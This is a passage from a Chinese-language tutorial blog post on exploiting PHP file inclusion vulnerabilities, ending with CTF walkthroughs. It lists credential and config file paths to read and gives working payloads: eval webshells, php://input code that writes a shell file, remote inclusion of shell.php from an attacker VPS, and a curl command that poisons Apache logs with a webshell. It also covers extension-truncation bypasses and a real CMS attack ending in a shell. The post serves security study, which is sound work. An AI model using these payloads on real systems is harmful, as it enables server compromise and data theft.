class="line">19</span><br></pre></td><td class="code"><pre><span class="line">// windows server</span><br><span class="line"></span><br><span class="line">c:\boot.ini // 查看系统版本</span><br><span class="line">c:\XX\httpd.conf  Apache配置信息</span><br><span class="line">c:\windows\system32\inetsrv\MetaBase.xml // IIS配置文件</span><br><span class="line">c:\windows\repair\sam // 存储Windows系统初次安装的密码</span><br><span class="line">c:\ProgramFiles\mysql\my.ini // MySQL配置</span><br><span class="line">c:\ProgramFiles\mysql\data\mysql\user.MYD // MySQL root密码</span><br><span class="line">c:\windows\php.ini // php 配置信息</span><br><span class="line"></span><br><span class="line">// Linux/Unix</span><br><span class="line"></span><br><span class="line">/etc/passwd 账户信息</span><br><span class="line">/etc/shadow  账户密码文件</span><br><span class="line">/etc/httpd/conf/httpd.conf  Apache配置文件</span><br><span class="line">/etc/my.conf  mysql 配置文件</span><br><span class="line">/usr/local/app/apache2/conf/httpd.conf  Apache2默认配置文件</span><br><span class="line">/usr/local/app/apache2/conf/extra/httpd-vhost.conf   虚拟网站配置</span><br><span class="line">/usr/local/app/php5/lib/php.ini PHP相关配置</span><br></pre></td></tr></table></figure><h3 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h3><p><strong>利用条件：</strong></p><p><code>allow_url_fopen = On</code> 是否允许将URL（HTTP，HTTPS等）作为文件打开处理</p><p><code>allow_url_include = On</code> 是否允许includeI()和require()函数包含URL（HTTP，HTTPS）作为文件解析处理</p><p>远程文件包含漏洞是因为开启了PHP配置中的<code>allow_url_fopen</code>选项，选项开启之后，<strong>服务器允许包含一个远程文件</strong>，服务器通过PHP特性（函数）去包含任意文件时，由于要包含的这个文件来源过滤不严，从而可以去包含一个恶意文件，而我们可以构造这个恶意文件来达到自己的目的。</p><p>比如使用 <code>http://192.168.75.138/shell.php</code> 来替换原 URL 中包含的文件名，可以远程执行 PHP 脚本。shell.php可以是一个一句话木马。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220804213230082.png" alt="image-20220804213230082"></p><h2 id="x3D-x3D-PHP伪协议-x3D-x3D-（重要）"><a href="#x3D-x3D-PHP伪协议-x3D-x3D-（重要）" class="headerlink" title="&#x3D;&#x3D;PHP伪协议&#x3D;&#x3D;（重要）"></a>&#x3D;&#x3D;PHP伪协议&#x3D;&#x3D;（重要）</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">file:// — 访问本地文件系统</span><br><span class="line">http:// — 访问 HTTP(s) 网址</span><br><span class="line">ftp:// — 访问 FTP(s) URLs</span><br><span class="line">php:// — 访问各个输入/输出流（I/O streams）</span><br><span class="line">zlib:// — 压缩流</span><br><span class="line">data:// — 数据（RFC 2397）</span><br><span class="line">glob:// — 查找匹配的文件路径模式</span><br><span class="line">phar:// — PHP 归档</span><br><span class="line">ssh2:// — Secure Shell 2</span><br><span class="line">rar:// — RAR</span><br><span class="line">ogg:// — 音频流</span><br><span class="line">expect:// — 处理交互式的流</span><br></pre></td></tr></table></figure><p><strong>各协议的利用条件和方法：</strong></p><p>参考：<a href="https://www.cnblogs.com/endust/p/11804767.html">https://www.cnblogs.com/endust/p/11804767.html</a></p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/1628997823639-8d22e937-1e94-4abd-9e2a-e459e009be24.png" alt="img"></p><h3 id="file-x2F-x2F"><a href="#file-x2F-x2F" class="headerlink" title="file:&#x2F;&#x2F;"></a>file:&#x2F;&#x2F;</h3><p>php 涉及到文件以及协议的地方默认使用 file 协议，如果没有写出协议名或者协议不存在，都会被当成 file 协议来解析。</p><p><code>file://[文件的绝对路径和文件名]</code></p><p>不受allow_url_fopen、allow_url_include 开启的限制。</p><p>如：<code>?a=file://C:/Windows/win.ini</code></p><h3 id="http-x2F-x2F-、ftp-x2F-x2F"><a href="#http-x2F-x2F-、ftp-x2F-x2F" class="headerlink" title="http:&#x2F;&#x2F;、ftp:&#x2F;&#x2F;"></a>http:&#x2F;&#x2F;、ftp:&#x2F;&#x2F;</h3><p>访问 HTTP(s) 网址、访问 FTP(s) URLs。允许通过 HTTP 1.0 的 GET方法，以 <strong>只读</strong> 访问文件或资源，通常用于远程包含。</p><p><strong>需要allow_url_fopen &#x3D; On、allow_url_include &#x3D; On。</strong></p><p>比如包含木马文件<code>?a=http://vps.vps.vps.vps/shell.php</code></p><p>木马文件（shell.txt）内容：<code>&lt;?php @eval($_POST[&#39;shell&#39;]);?&gt;</code></p><h3 id="php-x2F-x2F"><a href="#php-x2F-x2F" class="headerlink" title="php:&#x2F;&#x2F;"></a><strong>php:&#x2F;&#x2F;</strong></h3><p>访问各个输入&#x2F;输出流（I&#x2F;O streams）。经常使用的是<code>php://filter</code>和<code>php://input</code>，<code>php://filter</code>用于读取源码，<code>php://input</code>用于执行php代码。</p><p>包括<code>php://stdin</code>、<code>php://stdout</code>、<code>php://stderr</code>、<code>php://input</code>、<code>php://output</code>、<code>php://filter</code>、<code>php://fd</code>、<code>php://memory</code>、<code>php://temp</code> 九种。</p><ul><li><p><strong>php:&#x2F;&#x2F;input</strong></p><p>访问请求的原始数据的只读流，将post请求的数据当作php代码 <strong>执行</strong>。注意<code>enctype=“multipart/form-data”</code> 的时候<code>php://input</code>是无效的。</p><p><strong>需要allow_url_include &#x3D; On，但是不受 allow_url_fopen 影响。</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">?page=php:<span class="comment">//input</span></span><br><span class="line"></span><br><span class="line">命令执行：</span><br><span class="line">POST:</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;ls&#x27;</span>);<span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">GetShell：</span><br><span class="line">POST:</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">fputs</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;hack.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php @eval($_POST[&#x27;</span>shell<span class="string">&#x27;]) ?&gt;&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220805094122145.png" alt="image-20220805094122145"></p></li><li><p><strong>php:&#x2F;&#x2F;filter</strong></p><p>数据流打开时的筛选过滤应用，<strong>读取&#x2F;解析</strong> 本地源代码。</p><p>不受 allow_url_fopen、allow_url_include 影响。</p><p><em>用于读取文件（增加base64编码）：</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?page=php://filter/read=convert.base64-encode/resource=index.php</span><br><span class="line">// 将php文件通过base64编码读出（&quot;read=&quot;可以省略），若不用base64编码，php文件就会作为脚本执行，无法输出源代码。</span><br><span class="line"></span><br><span class="line">?file=php://filter/read=convert.base64-encode/resource=flag.php</span><br><span class="line">//读取文件源码</span><br></pre></td></tr></table></figure><p><em>用于解析（执行）文件，可用于getshell：</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">用于GetShell（shell.txt需通过文件上传在目标服务器上）：</span><br><span class="line">木马文件（shell.txt）内容：&lt;?php @eval($_POST[&#x27;x&#x27;]);?&gt;</span><br><span class="line"></span><br><span class="line">然后菜刀连接 http://localhost/test.php?file=php://filter/resource=./1.txt 即可。</span><br></pre></td></tr></table></figure></li></ul><h3 id="data-x2F-x2F"><a href="#data-x2F-x2F" class="headerlink" title="data:&#x2F;&#x2F;"></a>data:&#x2F;&#x2F;</h3><p><strong>需要allow_url_fopen&#x3D;On，allow_url_include&#x3D;On。</strong></p><p>将data:&#x2F;&#x2F;所指内容 <strong>执行</strong>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data://text/plain,待执行的文本内容</span><br></pre></td></tr></table></figure><p><code>http://127.0.0.1:8080/include.php?filename=data://text/plain,&lt;?php%20phpinfo(); ?&gt;</code></p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220805094336370.png" alt="image-20220805094336370"></p><h3 id="zip-x2F-x2F"><a href="#zip-x2F-x2F" class="headerlink" title="zip:&#x2F;&#x2F;"></a>zip:&#x2F;&#x2F;</h3><p>压缩流，可以访问压缩文件中的子文件，将子文件的内容当做 php 代码 <strong>执行</strong>。</p><p><strong>不受 allow_url_fopen、allow_url_include 影响。</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?page=zip://D:/phpStudy/WWW/file.zip%23code.txt</span><br><span class="line"></span><br><span class="line">格式：</span><br><span class="line">zip://[压缩包绝对路径]#[压缩包内的子文件名]</span><br><span class="line">注：文件路径必须为绝对路径；zip文件后缀名可以改为其他如图片后缀；#进行url编码为%23</span><br></pre></td></tr></table></figure><h3 id="zlib-x2F-x2F-、bzip2-x2F-x2F"><a href="#zlib-x2F-x2F-、bzip2-x2F-x2F" class="headerlink" title="zlib:&#x2F;&#x2F;、bzip2:&#x2F;&#x2F;"></a>zlib:&#x2F;&#x2F;、bzip2:&#x2F;&#x2F;</h3><p>压缩流，可以访问压缩文件中的子文件，将子文件的内容当做 php 代码 <strong>执行</strong>。</p><p><strong>不受 allow_url_fopen、allow_url_include 影响。</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?page=compress.zlib://file.zip</span><br><span class="line">注：文件路径无绝对路径限制；zlib://协议文件压缩为zip或gz都可以，bzip2://协议文件压缩为bz2；后缀名也可以改为其他，如图片后缀</span><br></pre></td></tr></table></figure><h2 id="各种文件包含"><a href="#各种文件包含" class="headerlink" title="各种文件包含"></a>各种文件包含</h2><h3 id="本地文件包含-1"><a href="#本地文件包含-1" class="headerlink" title="本地文件包含"></a>本地文件包含</h3><p>利用网站报错日志写入木马程序。</p><p>流程如下：</p><ul><li>首先需要找到日志文件的存储位置</li><li>借助报错，往日志文件写木马</li><li>使用工具（菜刀或者蚁剑）连接</li></ul><h3 id="包含上传文件（先上传，后包含）"><a href="#包含上传文件（先上传，后包含）" class="headerlink" title="包含上传文件（先上传，后包含）"></a>包含上传文件（先上传，后包含）</h3><p>假设已经上传一句话图片木马到服务器，路径为<code>/upload/201811.jpg</code>。</p><p>图片代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span><span class="title function_ invoke__">fputs</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&quot;shell.php&quot;</span>,<span class="string">&quot;w&quot;</span>),<span class="string">&quot;&lt;?php eval(<span class="subst">$_POST</span>[&#x27;pass&#x27;]);?&gt;&quot;</span>)<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>然后访问URL：<code>http://www.xxxx.com/index.php?page=./upload/201811.jpg</code>，包含这张图片，将会在index.php所在的目录下生成shell.php</strong>。</p><h3 id="包含Apache日志文件"><a href="#包含Apache日志文件" class="headerlink" title="包含Apache日志文件"></a>包含Apache日志文件</h3><p>WEB服务器一般会将用户的访问记录保存在访问日志中。那么我们可以根据日志记录的内容，精心构造请求，把PHP代码插入到日志文件中，通过文件包含漏洞来执行日志中的PHP代码。</p><p>前提是知道日志的物理存放路径。</p><p><strong>日志默认路径</strong></p><ol><li><p><strong>apache+Linux日志默认路径</strong></p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/etc/httpd/logs/access_log  </span><br><span class="line">    /var/log/httpd/access_log</span><br></pre></td></tr></table></figure></li><li><p><strong>apache+win2003日志默认路径</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">D:\xampp\apache\logs\access.log</span><br><span class="line">D:\xampp\apache\logs\error.log</span><br></pre></td></tr></table></figure></li><li><p><strong>IIS6.0+win2003默认日志文件</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\WINDOWS\system32\Logfiles</span><br></pre></td></tr></table></figure></li><li><p><strong>IIS7.0+win2003 默认日志文件</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%SystemDrive%\inetpub\logs\LogFiles</span><br></pre></td></tr></table></figure></li><li><p><strong>nginx 日志文件</strong></p><p>日志文件在用户安装目录logs目录下。以我的安装路径为例<code>/usr/local/nginx</code>，那我的日志目录就是在<code>/usr/local/nginx/logs</code>里。</p></li></ol><p><strong>web中间件默认配置</strong></p><ol><li><p><strong>apache+linux 默认配置文件</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/etc/httpd/conf/httpd.conf</span><br><span class="line">index.php?page=/etc/init.d/httpd</span><br></pre></td></tr></table></figure></li><li><p><strong>IIS6.0+win2003 配置文件</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:/Windows/system32/inetsrv/metabase.xml</span><br></pre></td></tr></table></figure></li><li><p><strong>IIS7.0+WIN 配置文件</strong></p></li></ol>   <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\System32\inetsrv\config\applicationHost.config</span><br></pre></td></tr></table></figure><p><strong>curl 构造一句话，写入日志文件测试记录</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -v &quot;http://127.0.0.1/php/1.php?page=&lt;?php @eval($_POST\[123\]);?&gt;&quot;?page=&lt;?php @eval($_POST\[123\]);?&gt;&quot;</span><br></pre></td></tr></table></figure><h3 id="包含session"><a href="#包含session" class="headerlink" title="包含session"></a>包含session</h3><p>可以先尝试包含到session文件，再根据session文件内容寻找可控变量，再构造payload插入到文件中，最后包含即可。</p><p><strong>前提</strong></p><ul><li>找到Session内的可控变量</li><li>Session文件可读写，并且知道存储路径</li></ul><p>session常见存储路径：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/var/lib/php/sess_PHPSESSID</span><br><span class="line">/var/lib/php/sess_PHPSESSID</span><br><span class="line">/tmp/sess_PHPSESSID</span><br><span class="line">/tmp/sessions/sess_PHPSESSID</span><br><span class="line">session文件格式： sess_[phpsessid] ，而 phpsessid 在发送的请求的 cookie 字段中可以看到。</span><br></pre></td></tr></table></figure><h3 id="包含-x2F-pros-x2F-self-x2F-environ"><a href="#包含-x2F-pros-x2F-self-x2F-environ" class="headerlink" title="包含&#x2F;pros&#x2F;self&#x2F;environ"></a>包含&#x2F;pros&#x2F;self&#x2F;environ</h3><p><code>proc/self/environ</code>中会保存<code>user-agent</code>头，如果在<code>user-agent</code>中插入php代码，则php代码会被写入到environ中，之后再包含它，即可。</p><p>利用条件：</p><ul><li>php以cgi方式运行，这样environ才会保持UA头。</li><li>environ文件存储位置已知，且environ文件可读。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">- /proc/cpuinfo：CPU 的信息 (型号, 家族, 缓存大小等) </span><br><span class="line">- /proc/meminfo：物理内存、交换空间等的信息 </span><br><span class="line">- /proc/mounts：已加载的文件系统的列表 </span><br><span class="line">- /proc/devices：可用设备的列表 </span><br><span class="line">- /proc/filesystems：被支持的文件系统 </span><br><span class="line">- /proc/modules：已加载的模块 </span><br><span class="line">- /proc/version：内核版本 </span><br><span class="line"></span><br><span class="line">- /proc/[pid]/cmdline：系统启动时输入的内核命令行参数。</span><br><span class="line">- /proc/[pid]/cwd：通过cwd命令可以直接跳转到当前目录。</span><br><span class="line">- /proc/[pid]/environ：环境变量中可能存在secret_key，这时也可以通过environ进行读取。</span><br><span class="line"></span><br><span class="line">上述路径中的PID是需要填写的进程号，当然我们不知道，但这里我们可以用 **self** 来表示我们自己现在正在用的进程。</span><br></pre></td></tr></table></figure><h3 id="包含临时文件"><a href="#包含临时文件" class="headerlink" title="包含临时文件"></a>包含临时文件</h3><p>php中上传文件，会创建临时文件。在linux下使用&#x2F;tmp目录，而在windows下使用c:\winsdows\temp目录。在临时文件被删除之前，利用竞争即可包含该临时文件。</p><p><strong>如何获取临时文件的文件名</strong>：</p><p>由于包含需要知道包含的文件名。一种方法是进行暴力猜解，linux下使用的随机函数有缺陷，而window下只有65535中不同的文件名，所以这个方法是可行的。</p><p>另一种方法是配合phpinfo页面的php variables，可以直接获取到上传文件的存储路径和临时文件名，直接包含即可。这个方法可以参考。</p><h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><h3 id="黑名单（协议、路径限制）"><a href="#黑名单（协议、路径限制）" class="headerlink" title="黑名单（协议、路径限制）"></a>黑名单（协议、路径限制）</h3><p>使用 <code>str_replace()</code> 函数把 <code>http://</code>、<code>https://</code>、<code>../</code>、<code>..\</code> 替换为了空值，来防止远程文件包含和相对路径的文件包含。</p><p><strong>绕过</strong>：在 <code>http://</code> 中再嵌套一个 <code>http://</code> ，以及在 <code>../</code> 中多嵌套一个 <code>../</code>，在 URL 中输入包含的文件名为 <code>..././..././phpinfo.php</code>，则可以绕过限制；另外，也可以使用绝对路径的文件包含。</p><h3 id="固定后缀"><a href="#固定后缀" class="headerlink" title="固定后缀"></a>固定后缀</h3><p>使用<code>include ( $filename.&quot; .html&quot; );</code>之类的方式固定后缀。但是存在绕过。</p><p><strong>绕过</strong>：各种截断：%00截断、路径长度截断、问号截断、#号截断、空格绕过等。</p><h3 id="固定所要包含的文件"><a href="#固定所要包含的文件" class="headerlink" title="固定所要包含的文件"></a>固定所要包含的文件</h3><p>不传参，直接写死include的文件。</p><h2 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h2><h3 id="无限制文件包含"><a href="#无限制文件包含" class="headerlink" title="无限制文件包含"></a>无限制文件包含</h3><p>无限制文件包含是指对于所包含的文件没有限制。无需绕过，可以直接进行文件包含攻击。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$filename</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$filename</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>利用条件</strong>:</p><p>需要 <code>allow_url_include=on</code></p><p><code>http://127.0.0.1:8080/include.php?filename=../../www.txt</code> 包含本地相对路径的文件。</p><p><code>http://127.0.0.1/test.php?filename=http://192.168.1.110/xiaohua.txt</code></p><p>包含在xiaohua.txt中的PHP代码通过远程文件包含被成功当成PHP代码解析。</p><h3 id="有限制文件包含（需要绕过）"><a href="#有限制文件包含（需要绕过）" class="headerlink" title="有限制文件包含（需要绕过）"></a>有限制文件包含（需要绕过）</h3><p>有限制文件包含是指当代码中存在特定的前缀或者.php、.html等扩展名过滤时，攻击者 <strong>需要绕过前缀或者扩展名过滤</strong>，才能执行远程URL中恶意代码。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">     <span class="variable">$filename</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">     <span class="keyword">include</span>(<span class="variable">$filename</span>.”.html”);    <span class="comment">// 在文件名后面强制增加html后缀</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>包含文件失败：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220805085328234.png" alt="image-20220805085328234"></p><h4 id="00截断"><a href="#00截断" class="headerlink" title="%00截断"></a>%00截断</h4><p>%00会被认为是结束符，后面的数据会被直接忽略，导致扩展名截断。</p><p>例如：<code>http://127.0.0.1/test.php?filename=xiaohua.txt%00</code></p><p><strong>利用条件：</strong></p><ol><li><p>magic_quotes_gpc&#x3D;off</p></li><li><p>PHP&lt;5.3.4</p></li></ol><h4 id="路径长度截断"><a href="#路径长度截断" class="headerlink" title="路径长度截断"></a>路径长度截断</h4><p>操作系统存在最大路径长度的限制。可以输入超过最大路径长度的目录，这样系统就会将后面的路径丢弃，导致扩展名截断。</p><p><strong>利用条件</strong></p><p>Windows下目录的最大路径256B</p><p>Linux下目录的最大路径长度为4096B（根据服务器操作系统决定）</p><p>测试payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?filename=1.txt/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././</span><br></pre></td></tr></table></figure><p>成功绕过，执行1.txt的内容<code>&lt;?php echo phpinfo() ?&gt;</code>。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220805085949121.png" alt="image-20220805085949121"></p><h4 id="点号截断"><a href="#点号截断" class="headerlink" title="点号截断"></a>点号截断</h4><p>点号截断适用于Windows系统，当点号的长度大于256B时，就可以造成扩展名截断。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220805090229043.png" alt="image-20220805090229043"></p><h4 id="问号绕过"><a href="#问号绕过" class="headerlink" title="问号绕过"></a>问号绕过</h4><p>因为问号会分隔实际的 URL 和参数</p><p><code>http://127.0.0.1/include.php?filename=http://www.xiaodi8.com/readme.txt?</code></p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220805091001770.png" alt="image-20220805091001770"></p><h4 id="＃号绕过"><a href="#＃号绕过" class="headerlink" title="＃号绕过"></a>＃号绕过</h4><p>因为 # 表示书签</p><p><code>http://127.0.0.1/include.php?filename=http://www.xiaodi8.com/readme.txt%23</code></p><p>注意<code>#</code>要编码为<code>%23</code></p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220805091124899.png" alt="image-20220805091124899"></p><h4 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h4><p><code>http://127.0.0.1/include.php?filename=http://www.xiaodi8.com/readme.txt%20</code></p><p>注意空格要编码为<code>%20</code></p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220805091238408.png" alt="image-20220805091238408"></p><h3 id="指定前缀绕过"><a href="#指定前缀绕过" class="headerlink" title="指定前缀绕过"></a>指定前缀绕过</h3><p>使用相对路径 ..&#x2F;..&#x2F; 来返回上一目录，被称为目录遍历(Path Traversal)。</p><p>例如 <code>?file=../../phpinfo/phpinfo.php</code></p><h3 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h3><p>服务器端常常会对于<code>../</code>等做一些过滤，可以用一些编码来进行绕过。</p><h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><h3 id="某CMS程序文件包含利用-黑盒"><a href="#某CMS程序文件包含利用-黑盒" class="headerlink" title="某CMS程序文件包含利用-黑盒"></a>某CMS程序文件包含利用-黑盒</h3><p>易酷CMS是一款影片播放CMS。该CMS2.5版本存在本地文件包含漏洞。我们可以利用这个漏洞，利用报错信息将一句话木马写入日志中。然后利用文件包含漏洞包含该日志文件，再用菜刀连接拿shell。</p><p>我们通过访问下面的url，将一句话木马写入日志文件中。由于文件包含时会自动将文件内容解析为php代码，所以下面的URL中并没有使用<code>&lt;?php ?&gt;</code>。该URL会发生报错：</p><p><code>http://192.168.10.22/index.php?s=my/show/id/&#123;~eval($_POST[x])&#125;</code></p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220805105735348.png" alt="image-20220805105735348"></p><p>然后就生成了相应的日志文件，文件存储有URL中的恶意代码：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220805105845794.png" alt="image-20220805105845794"></p><p>该日志是以时间日期命名的，测试一句话木马：</p><p><code>http://192.168.10.22/index.php?s=my/show/id/../temp/logs/20_08_14.log</code></p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220805110122484.png" alt="image-20220805110122484"></p><p>用菜刀连接该日志文件，得到shell。</p><h3 id="CTF-南邮大"><a href="#CTF-南邮大" class="headerlink" title="CTF-南邮大"></a>CTF-南邮大</h3><p><a href="http://4.chinalover.sinaapp.com/web7/index.php">http://4.chinalover.sinaapp.com/web7/index.php</a></p><p>进入网站：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220805095409995.png" alt="image-20220805095409995"></p><p>点击click me? no，发生跳转：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220805095508199.png" alt="image-20220805095508199"></p><ul><li><strong>确定是否为文件包含</strong></li></ul><p>发现网站URL的参数名为file且接收一个文件名，判断可能考察文件包含。直接访问show.php看看：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220805100147678.png" alt="image-20220805100147678"></p><p><strong>与<code>file=show.php</code>显示是一样的，说明<code>index.php?file=show.php</code>存在文件包含</strong>。</p><ul><li><strong>尝试包含其他文件</strong></li></ul><p>尝试使用php:&#x2F;&#x2F;input进行文件包含攻击，执行恶意php代码：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220805100427271.png" alt="image-20220805100427271"></p><p>执行失败，说明存在过滤，可能检测到了php之类的关键字，或者<code>allow_url_include</code> 不为on。</p><p>尝试使用不受<code>allow_url_include</code>限制的<code>php://filter</code>读取文件，判断是哪种情况：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220805101720074.png" alt="image-20220805101720074"></p><p>发现读取成功，说明是<code>allow_url_include</code> 不为on。</p><p>把读取内容base64解码，找到flag。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220805101917895.png" alt="image-20220805101917895"></p><h3 id="i春秋web-include百度杯真题"><a href="#i春秋web-include百度杯真题" class="headerlink" title="i春秋web include百度杯真题"></a>i春秋web include百度杯真题</h3><p>进入题目链接：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220805102613276.png" alt="image-20220805102613276"></p><p>网页给出了网站的php源码，发现存在文件包含。</p><p>尝试提交path参数，包含phpinfo.php，成功。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220805103044931.png" alt="image-20220805103044931"></p><p>尝试包含index.php，成功。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220805102851837.png" alt="image-20220805102851837"></p><p>发现存在index.php。改为index.phP，发现报错。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220805103606874.png" alt="image-20220805103606874"></p><p>说明系统对大小写敏感，为linux系统，而且从报错信息来看也知道是linux。</p><p>进一步尝试使用<code>php://input</code>来包含恶意代码：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220805103801767.png" alt="image-20220805103801767"></p><p>查看可疑文件，查看页面源代码，得到flag：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220805103943697.png" alt="image-20220805103943697"></p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220805103953364.png" alt="image-20220805103953364"></p><p>或者也可以使用<code>php://filter</code>读取该文件：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220805104100186.png" alt="image-20220805104100186"></p><p>然后base64解码即可。</p><p><img 